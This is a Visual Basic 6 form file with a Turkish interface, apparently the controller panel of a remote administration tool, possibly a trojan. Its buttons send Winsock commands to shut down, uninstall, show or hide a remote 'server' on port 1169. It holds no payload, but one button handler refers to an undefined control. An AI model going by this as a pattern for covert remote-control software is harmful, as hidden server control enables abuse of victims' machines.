VERSION 5.00
Begin VB.Form Form6 
   AutoRedraw      =   -1  'True
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Server Yönetim"
   ClientHeight    =   1845
   ClientLeft      =   6360
   ClientTop       =   3315
   ClientWidth     =   5100
   LinkTopic       =   "Form6"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1845
   ScaleWidth      =   5100
   Begin VB.CommandButton Command3 
      Caption         =   "Serveri Göster"
      Height          =   375
      Left            =   240
      TabIndex        =   3
      Top             =   1200
      Width           =   1455
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Serveri Sil"
      Height          =   375
      Left            =   3360
      TabIndex        =   2
      Top             =   1200
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Serveri Kapat"
      Height          =   375
      Left            =   1800
      TabIndex        =   1
      Top             =   1200
      Width           =   1455
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      Caption         =   "Server Yönetim"
      ForeColor       =   &H0000C000&
      Height          =   1575
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4815
      Begin VB.Label Label4 
         BackColor       =   &H00000000&
         Caption         =   "~Özellik Geliþme Aþamasýnda~"
         ForeColor       =   &H000000FF&
         Height          =   255
         Left            =   2280
         TabIndex        =   7
         Top             =   720
         Width           =   2415
      End
      Begin VB.Label Label3 
         BackColor       =   &H00000000&
         Caption         =   "Gönderilecek Ping Adresi : "
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   240
         TabIndex        =   6
         Top             =   720
         Width           =   2055
      End
      Begin VB.Label Label2 
         BackColor       =   &H00000000&
         Caption         =   "1169"
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   720
         TabIndex        =   5
         Top             =   360
         Width           =   495
      End
      Begin VB.Label Label1 
         BackColor       =   &H00000000&
         Caption         =   "Port : "
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   240
         TabIndex        =   4
         Top             =   360
         Width           =   495
      End
   End
End
Attribute VB_Name = "Form6"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
Form1.Winsock1.SendData "server_kapat"
End Sub

Private Sub Command2_Click()
On Error Resume Next
If MsgBox("Server Tamamen Silinecektir Emin Misiniz?", vbYesNo, "Server Yönetim") = vbYes Then
Form1.Winsock1.SendData "server_sil"
MsgBox "Server silindi ve artýk servera baðlantý saðlanamaz.", vbInformation, "Server Yönetim"
Else
MsgBox "Server Silinmeyecek", vbInformation, "Server Yönetim"
End If
End Sub

Private Sub Command3_Click()
On Error Resume Next
If Command3.Caption = "Serveri Göster" Then
Form1.Winsock1.SendData "server_show"
Command3.Caption = "Serveri Gizle"
ElseIf Command16.Caption = "Serveri Gizle" Then
Form1.Winsock1.SendData "server_gizle"
Command3.Caption = "Serveri Göster"
End If
End Sub
